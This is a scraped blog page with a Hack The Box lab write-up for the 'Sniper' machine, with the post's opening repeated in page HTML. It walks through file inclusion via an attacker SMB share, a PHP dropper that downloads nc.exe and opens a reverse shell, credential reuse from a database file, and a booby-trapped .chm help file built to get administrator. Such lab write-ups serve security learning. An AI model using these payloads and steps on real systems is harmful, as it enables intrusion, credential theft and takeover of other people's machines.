We see that it is trying to include other .php files for different languages! Maybe we can do some local file inclusion (LFI)? I tried setting ?lang=index.php, only to realise that it would cause the server to recursively include index.php endlessly. Hence, we know that LFI is possible here. Exploitation (1) I tried many LFI techniques seen here but most of them didn’t work. It was as if there was some validation going on to prevent LFI. That was when I was thinking: hmm… this is a Windows box right? What happens if we try to include a file in a SMB share? That was when I saw this in the same link: Lets test out this theory. First, I create a new folder on my Desktop: 1 $ mkdir ~/Desktop/fileshare And then configured my Samba config to create a new SMB share called public: 1 2 3 4 5 6 $ cat /etc/samba/smb.conf ... [public]: force user = nobody path = /root/Desktop/fileshare public = yes With that done, I create a .php file in it : 1 2 $ cat /root/Desktop/fileshare/phpinfo.php &lt;?php phpinfo(); ?&gt; And start my smbd service: 1 $ systemctl start smbd Now if we browse to /blog/?lang=\\\\10.10.XX.XX\\public\\phpinfo.php: We have successfully upgraded from LFI to remote file inclusion (RFI) :) Nows lets try to establish a reverse shell back to us. Since PHP reverse shells are sometimes a little wonky , I’m going to upload a nc.exe and use it to connecting back to our listener. Starting a webserver: 1 2 3 4 $ mkdir ~/Desktop/web $ cp /usr/share/windows-resources/binaries/nc.exe ~/Desktop/web $ python3 -m http.server 80 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ... Creating a .php file to download nc.exe and connect back to us: 1 2 3 4 5 6 7 8 9 $ cat /root/Desktop/fileshare/rev.php &lt;?php # Create a temp dir system(&quot;mkdir C:\\\\tmp&quot;); # Download nc.exe system(&quot;curl http://10.10.XX.XX/nc.exe &gt; C:\\\\tmp\\\\nc.exe&quot;); # Establish reverse shell system(&quot;C:\\\\tmp\\\\nc.exe -e cmd.exe 10.10.XX.XX 1337&quot;); ?&gt; Starting our listener: 1 2 $ nc -lvnp 1337 listening on [any] 1337 ... Triggering our .php script and getting a shell: 1 $ curl &#39;http://sniper.htb/blog/?lang=\\\\10.10.XX.XX\\public\\shell.php&#39; 1 2 3 4 5 6 7 connect to [10.10.XX.XX] from (UNKNOWN) [10.10.10.151] 50128 Microsoft Windows [Version 10.0.17763.678] (c) 2018 Microsoft Corporation. All rights reserved. C:\\inetpub\\wwwroot\\blog&gt;whoami whoami nt authority\\iusr Enumeration (2) Listing local users: 1 2 3 4 5 6 7 8 9 C:\\inetpub\\wwwroot\\blog&gt;net users net users User accounts for \\\\ ------------------------------------------------------------------------------- Administrator Chris DefaultAccount Guest WDAGUtilityAccount The command completed with one or more errors. Seems like the user.txt is residing in Chris but we do not know his credentials. Looking around, I found MySQL credentials in C:\\inetpub\\wwwroot\\users: 1 2 3 4 5 6 7 8 9 10 11 12 C:\\inetpub\\wwwroot\\user&gt;type db.php type db.php &lt;?php // Enter your Host, username, password, database below. // I left password empty because i do not set password on localhost. $con = mysqli_connect(&quot;localhost&quot;,&quot;dbuser&quot;,&quot;36mEAhz/B8xQ~2VM&quot;,&quot;sniper&quot;); // Check connection if (mysqli_connect_errno()) { echo &quot;Failed to connect to MySQL: &quot; . mysqli_connect_error(); } ?&gt; and also saw how the login feature for the website was implemented: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 &lt;?php require(&#39;db.php&#39;); session_start(); // If form submitted, insert values into the database. if (isset($_POST[&#39;username&#39;])){ // removes backslashes $username = stripslashes($_REQUEST[&#39;username&#39;]); //escapes special characters in a string $username = mysqli_real_escape_string($con,$username); $password = stripslashes($_REQUEST[&#39;password&#39;]); $password = mysqli_real_escape_string($con,$password); //Checking is user existing in the database or not $query = &quot;SELECT * FROM `users` WHERE username=&#39;$username&#39; and password=&#39;&quot;.md5($password).&quot;&#39;&quot;; $result = mysqli_query($con,$query) or die(mysql_error()); $rows = mysqli_num_rows($result); if($rows==1){ $_SESSION[&#39;username&#39;] = $username; // Redirect user to index.php header(&quot;Location: index.php&quot;); }else{ ... From this, we can tell that some possible usernames and passwords are stored in the users table in the columns username and password so lets try to dump them out: Creating a .php file to dump out the users table: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 $ cat ~/Desktop/fileshare/dump.php &lt;?php $conn = mysqli_connect(&quot;localhost&quot;,&quot;dbuser&quot;,&quot;36mEAhz/B8xQ~2VM&quot;,&quot;sniper&quot;); // Check connection if (mysqli_connect_errno()) { echo &quot;Failed to connect to MySQL: &quot; . mysqli_connect_error(); } $sql = &quot;SELECT * from users&quot;; $result = mysqli_query($conn, $sql); if (mysqli_num_rows($result) &gt; 0) { // output data of each row while($row = mysqli_fetch_assoc($result)) { print_r($row); } } else { echo &quot;0 results&quot;; } mysqli_close($conn); ?&gt; Viewing the results: 1 2 3 4 5 6 7 8 9 10 11 $ curl &#39;http://sniper.htb/blog/?lang=\\\\10.10.XX.XX\\public\\dump.php&#39; ... Array ( [id] =&gt; 1 [username] =&gt; superuser [email] =&gt; admin@sniper.co [password] =&gt; 6e573c8b25e9168e0c61895d821a3d57 [trn_date] =&gt; 2019-04-11 22:45:36 ) ... Putting the hash into Google (Yes Google), turns out it was the MD5 hash of $uperpassw0rd. Using smbmap, I decided to manually test possible pairs of credentials since the password list was short: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 smbmap -H sniper.htb -u Chris -p &quot;$uperpassw0rd&quot; [+] Finding open SMB ports.... [!] Authentication error on sniper.htb [!] Authentication error on sniper.htb root@kali:~/Desktop# smbmap -H sniper.htb -u Chris -p 36mEAhz/B8xQ~2VM [+] Finding open SMB ports.... [+] User SMB session established on sniper.htb... [+] IP: sniper.htb:445 Name: unknown Disk Permissions Comment ---- ----------- ------- ADMIN$ NO ACCESS Remote Admin C$ NO ACCESS Default share ... IPC$ READ ONLY Remote IPC Alright, we got Chris’s credentials. To login into Chris, we will need to do something like a su or sudo in Linux but for Windows! In Powershell, there is a cmdlet called Invoke-Command which allows you to specify who to run as using -Credential or -Session. Testing Invoke-Command: 1 2 3 4 5 6 7 8 9 C:\\inetpub\\wwwroot\\blog&gt;powershell powershell Windows PowerShell Copyright (C) Microsoft Corporation. All rights reserved. PS C:\\inetpub\\wwwroot\\blog&gt; $SecPassword = ConvertTo-SecureString &#39;36mEAhz/B8xQ~2VM&#39; -AsPlainText -Force PS C:\\inetpub\\wwwroot\\blog&gt; $Cred = New-Object System.Management.Automation.PSCredential(&#39;.\\Chris&#39;, $SecPassword) PS C:\\inetpub\\wwwroot\\blog&gt; $TestPCSession = New-PSSession -Credential $Cred PS C:\\inetpub\\wwwroot\\blog&gt; Invoke-Command -Session $TestPCSession -ScriptBlock {cmd.exe /c whoami} sniper\\chris It works! We were able to run commands as chris! Now lets try to establish another reverse shell as chris. user.txt Starting our listener: 1 2 $ nc -lvnp 1337 listening on [any] 1337 ... And running nc.exe to connect back to us: 1 PS C:\\inetpub\\wwwroot\\blog&gt; Invoke-Command -Session $TestPCSession -ScriptBlock {cmd.exe /c C:\\tmp\\nc.exe -e cmd.exe 10.10.XX 1337} 1 2 3 4 5 6 7 8 9 10 connect to [10.10.XX.XX] from (UNKNOWN) [10.10.10.151] 49687 Microsoft Windows [Version 10.0.17763.678] (c) 2018 Microsoft Corporation. All rights reserved. C:\\Users\\Chris\\Documents&gt;whoami whoami sniper\\chris C:\\Users\\Chris\\Documents&gt;type C:\\Users\\Chris\\Desktop\\user.txt type C:\\Users\\Chris\\Desktop\\user.txt 21f4XXXXXXXXXXXXXXXXXXXXXXXXXXXX Enumeration (2) Looking around, I found a file in chris’s download folder: 1 2 3 4 5 6 7 8 9 10 11 12 C:\\Users\\Chris\\Downloads&gt;dir dir Volume in drive C has no label. Volume Serial Number is 6A2B-2640 Directory of C:\\Users\\Chris\\Downloads 04/11/2019 08:36 AM &lt;DIR&gt; . 04/11/2019 08:36 AM &lt;DIR&gt; .. 04/11/2019 08:36 AM 10,462 instructions.chm 1 File(s) 10,462 bytes 2 Dir(s) 17,988,661,248 bytes free Using nc.exe, I downloaded the instructions.chm file and opened it in a Windows VM. Starting our listener: 1 2 $ nc -lvnp 1337 &gt; instructions.chm listening on [any] 1337 ... Sending the file over: 1 C:\\Users\\Chris\\Downloads&gt;C:\\tmp\\nc.exe 10.10.XX.XX 1337 &lt; instructions.chm Looks like we have a disgrunted employee here haha but nothing much here. I also found a folder called C:\\Docs: 1 2 3 4 5 6 7 8 9 10 11 12 13 C:\\Docs&gt;dir dir Volume in drive C has no label. Volume Serial Number is 6A2B-2640 Directory of C:\\Docs 10/01/2019 01:04 PM &lt;DIR&gt; . 10/01/2019 01:04 PM &lt;DIR&gt; .. 04/11/2019 09:31 AM 285 note.txt 04/11/2019 09:17 AM 552,607 php for dummies-trial.pdf 2 File(s) 552,892 bytes 2 Dir(s) 17,993,322,496 bytes free In the note.txt: 1 2 3 4 5 Hi Chris, Your php skillz suck. Contact yamitenshi so that he teaches you how to use it and after that fix the website as there are a lot of bugs on it. And I hope that you&#39;ve prepared the documentation for our new app. Drop it here when you&#39;re done with it. Regards, Sniper CEO. Wow what a tough boss… Hmm… Could the instructions.chm be the documentation that the boss is talking about? If we try copying the instructions.chm to C:\\Docs: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 C:\\Docs&gt;copy C:\\Users\\Chris\\Downloads\\instructions.chm . copy C:\\Users\\Chris\\Downloads\\instructions.chm . 1 file(s) copied. C:\\Docs&gt;dir dir Volume in drive C has no label. Volume Serial Number is 6A2B-2640 Directory of C:\\Docs 03/29/2020 06:38 AM &lt;DIR&gt; . 03/29/2020 06:38 AM &lt;DIR&gt; .. 04/11/2019 08:36 AM 10,462 instructions.chm 04/11/2019 09:31 AM 285 note.txt 04/11/2019 09:17 AM 552,607 php for dummies-trial.pdf 3 File(s) 563,354 bytes 2 Dir(s) 17,974,849,536 bytes free And after a while, it disappeared! 1 2 3 4 5 6 7 8 9 10 11 12 13 C:\\Docs&gt;dir dir Volume in drive C has no label. Volume Serial Number is 6A2B-2640 Directory of C:\\Docs 03/29/2020 06:38 AM &lt;DIR&gt; . 03/29/2020 06:38 AM &lt;DIR&gt; .. 04/11/2019 09:31 AM 285 note.txt 04/11/2019 09:17 AM 552,607 php for dummies-trial.pdf 2 File(s) 552,892 bytes 2 Dir(s) 17,974,861,824 bytes free It is possible that the CEO is retrieving the file and opening it. Using nishang’s Out-CHM.ps1, we can actually generate a malicious .chm that run arbitrary commands. root.txt First we will need to install HTML Help Workshop. After some testing on my local machines, I managed to generate the correct .chm file: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 PS C:\\Users\\rizemon\\Desktop&gt; Import-Module .\\Out-CHM.ps1 PS C:\\Users\\rizemon\\Desktop&gt; Out-CHM -Payload &quot;C:\\\\tmp\\\\nc.exe -e cmd.exe 10.10.XX.XX 1337&quot; -HHCPath &quot;C:\\Program Files (x86)\\HTML Help Workshop&quot; Microsoft HTML Help Compiler 4.74.8702 Compiling c:\\Users\\root\\Desktop\\doc.chm Compile time: 0 minutes, 0 seconds 2 Topics 4 Local links 4 Internet links 0 Graphics Created c:\\Users\\rizemon\\Desktop\\doc.chm, 13,438 bytes Compression increased file by 142 bytes. After transfering the doc.chm to my Kali’s web server directory, I uploaded it to C:\\Docs as instructions.chm. 1 2 3 4 5 C:\\Docs&gt;curl http://10.10.XX.XX/doc.chm &gt; instructions.chm curl http://10.10.XX.XX/doc.chm &gt; instructions.chm % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 100 13436 100 13436 0 0 13436 0 0:00:01 --:--:-- 0:00:01 18687 And started our listener: 1 2 $ nc -lvnp 1337 listening on [any] 1337 ... After a while, the instructions.chm disappeared and look at what we got on our listener! 1 2 3 4 5 6 7 8 9 10 11 connect to [10.10.XX.XX] from (UNKNOWN) [10.10.10.151] 49709 Microsoft Windows [Version 10.0.17763.678] (c) 2018 Microsoft Corporation. All rights reserved. C:\\Windows\\system32&gt;whoami whoami sniper\\administrator C:\\Windows\\system32&gt;type C:\\Users\\Administrator\\Desktop\\root.txt type C:\\Users\\Administrator\\Desktop\\root.txt 5624XXXXXXXXXXXXXXXXXXXXXXXXXXXX Rooted ! Thank you for reading and look forward for more writeups and articles !","url":"https://rizemon.github.io/posts/sniper-htb/","@type":"BlogPosting","headline":"Hack The Box - Sniper","dateModified":"2021-01-03T20:34:47+08:00","datePublished":"2020-03-29T15:00:00+08:00","@context":"https://schema.org"}</script><title>Hack The Box - Sniper | rizemon's blog</title><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon.png"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon-precomposed.png"><link rel="apple-touch-icon" sizes="57x57" href="/assets/img/favicons/apple-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="/assets/img/favicons/apple-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="/assets/img/favicons/apple-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="/assets/img/favicons/apple-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="/assets/img/favicons/apple-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="/assets/img/favicons/apple-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="/assets/img/favicons/apple-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="/assets/img/favicons/apple-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-icon-180x180.png"><link rel="icon" type="image/png" sizes="192x192" href="/assets/img/favicons/android-icon-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="/assets/img/favicons/favicon-96x96.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/manifest.json"><meta name='msapplication-config' content='/assets/img/favicons/browserconfig.xml'><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="/assets/img/favicons/ms-icon-144x144.png"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="cdn.jsdelivr.net"><link rel="dns-prefetch" href="cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"><link rel="preload" href="/assets/css/post.css" as="style"><link rel="stylesheet" href="/assets/css/post.css"><link rel="preload" as="style" href="/assets/css/lib/bootstrap-toc.min.css"><link rel="stylesheet" href="/assets/css/lib/bootstrap-toc.min.css" /> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script defer src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script async src="/assets/js/post.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id="></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); }); </script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/portfolio.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">rizemon's blog</a></div><div class="site-subtitle font-italic">Cyber Security Enthusiast.</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/tabs/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tabs/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/tabs/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/tabs/about/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT ME</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center"> <a href="https://github.com/rizemon" aria-label="github" class="order-3" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/rizemon" aria-label="twitter" class="order-4" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['',''].join('@')" aria-label="email" class="order-5" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" class="order-6" > <i class="fas fa-rss"></i> </a> <span class="icon-border order-2"></span> <span id="mode-toggle-wrapper" class="order-1"> <i class="mode-toggle fas fa-adjust"></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.updateMermaid(); }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer) ) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } updateMermaid() { if (typeof mermaid !== "undefined") { let expectedTheme = (this.modeStatus === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } this.updateMermaid(); } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>Hack The Box - Sniper</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Hack The Box - Sniper</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Sun, Mar 29, 2020, 3:00 PM +0800" > Mar 29, 2020 <i class="unloaded">2020-03-29T15:00:00+08:00</i> </span> by <span class="author"> rizemon </span></div><div> <span> Updated <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Sun, Jan 3, 2021, 8:34 PM +0800" > Jan 3, 2021 <i class="unloaded">2021-01-03T20:34:47+08:00</i> </span> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="2076 words">11 min</span></div></div><div class="post-content"><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/sniper.png" alt="" height="414px" width="615px" /></p><h1 id="configuration">Configuration</h1><p>The operating system that I will be using to tackle this machine is a Kali Linux VM.</p><p>What I learnt from other writeups is that it was a good habit to map a domain name to the machine’s IP address so as that it will be easier to remember. This can done by appending a line to <code class="language-plaintext highlighter-rouge">/etc/hosts</code>.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">echo</span> <span class="s2">"10.10.10.151 sniper.htb"</span> <span class="o">&gt;&gt;</span> /etc/hosts
+</pre></table></code></div></div><h1 id="reconnaissance">Reconnaissance</h1><p>Using <code class="language-plaintext highlighter-rouge">nmap</code>, we are able to determine the open ports and running services on the machine.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+</pre><td class="rouge-code"><pre><span class="nv">$ </span>nmap <span class="nt">-sV</span> <span class="nt">-sT</span> <span class="nt">-sC</span> sniper.htb
+Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2020-03-27 11:11 EDT
+Stats: 0:00:02 elapsed<span class="p">;</span> 0 hosts completed <span class="o">(</span>1 up<span class="o">)</span>, 1 undergoing Connect Scan
+Connect Scan Timing: About 0.65% <span class="k">done
+</span>Nmap scan report <span class="k">for </span>sniper.htb <span class="o">(</span>10.10.10.151<span class="o">)</span>
+Host is up <span class="o">(</span>0.27s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 996 filtered ports
+PORT    STATE SERVICE       VERSION
+80/tcp  open  http          Microsoft IIS httpd 10.0
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: Sniper Co.
+135/tcp open  msrpc         Microsoft Windows RPC
+139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp open  microsoft-ds?
+Service Info: OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: 7h02m46s
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   <span class="nb">date</span>: 2020-03-27T22:15:44
+|_  start_date: N/A
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>94.42 seconds
+</pre></table></code></div></div><h1 id="enumeration-1">Enumeration (1)</h1><p>Port 80 seems like a good place to start.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/sniper1.png" alt="" /></p><p>There was a login and a registration page:</p><p><code class="language-plaintext highlighter-rouge">/user/login.php and /user/registration.php</code></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/sniper2.png" alt="" /></p><p>We can register a new account and login with it but to be only presented with this :(</p><p><code class="language-plaintext highlighter-rouge">/user/index.php</code></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/sniper3.png" alt="" /></p><p>There was also a blog page:</p><p><code class="language-plaintext highlighter-rouge">/blog/index.php</code></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/sniper4.png" alt="" /></p><p>But then when we view it in other languages by clicking on the options in the “Language” dropdown menu:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/sniper5.png" alt="" /></p><p>We see that it is trying to include other <code class="language-plaintext highlighter-rouge">.php</code> files for different languages! Maybe we can do some local file inclusion (LFI)?</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/sniper6.png" alt="" /></p><p>I tried setting <code class="language-plaintext highlighter-rouge">?lang=index.php</code>, only to realise that it would cause the server to recursively include <code class="language-plaintext highlighter-rouge">index.php</code> endlessly. Hence, we know that LFI is possible here.</p><h1 id="exploitation-1">Exploitation (1)</h1><p>I tried many LFI techniques seen <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion">here</a> but most of them didn’t work. It was as if there was some validation going on to prevent LFI.</p><p>That was when I was thinking: hmm… this is a Windows box right? What happens if we try to include a file in a <code class="language-plaintext highlighter-rouge">SMB</code> share? That was when I saw this in the same link:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/sniper7.png" alt="" /></p><p>Lets test out this theory.</p><p>First, I create a new folder on my Desktop:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">mkdir</span> ~/Desktop/fileshare
+</pre></table></code></div></div><p>And then configured my <code class="language-plaintext highlighter-rouge">Samba</code> config to create a new <code class="language-plaintext highlighter-rouge">SMB</code> share called <code class="language-plaintext highlighter-rouge">public</code>:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+</pre><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">cat</span> /etc/samba/smb.conf
+...
+<span class="o">[</span>public]:
+	force user <span class="o">=</span> nobody
+	path <span class="o">=</span> /root/Desktop/fileshare
+	public <span class="o">=</span> <span class="nb">yes</span>
+</pre></table></code></div></div><p>With that done, I create a <code class="language-plaintext highlighter-rouge">.php</code> file in it :</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">cat</span> /root/Desktop/fileshare/phpinfo.php
+&lt;?php phpinfo<span class="o">()</span><span class="p">;</span> ?&gt;
+</pre></table></code></div></div><p>And start my <code class="language-plaintext highlighter-rouge">smbd</code> service:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre><span class="nv">$ </span>systemctl start smbd
+</pre></table></code></div></div><p>Now if we browse to <code class="language-plaintext highlighter-rouge">/blog/?lang=\\10.10.XX.XX\public\phpinfo.php</code>:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/sniper8.png" alt="" /></p><p>We have successfully upgraded from LFI to remote file inclusion (RFI) :)</p><p>Nows lets try to establish a reverse shell back to us. Since <code class="language-plaintext highlighter-rouge">PHP</code> reverse shells are sometimes a little wonky , I’m going to upload a <code class="language-plaintext highlighter-rouge">nc.exe</code> and use it to connecting back to our listener.</p><p>Starting a webserver:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">mkdir</span> ~/Desktop/web
+<span class="nv">$ </span><span class="nb">cp</span> /usr/share/windows-resources/binaries/nc.exe ~/Desktop/web
+<span class="nv">$ </span>python3 <span class="nt">-m</span> http.server 80
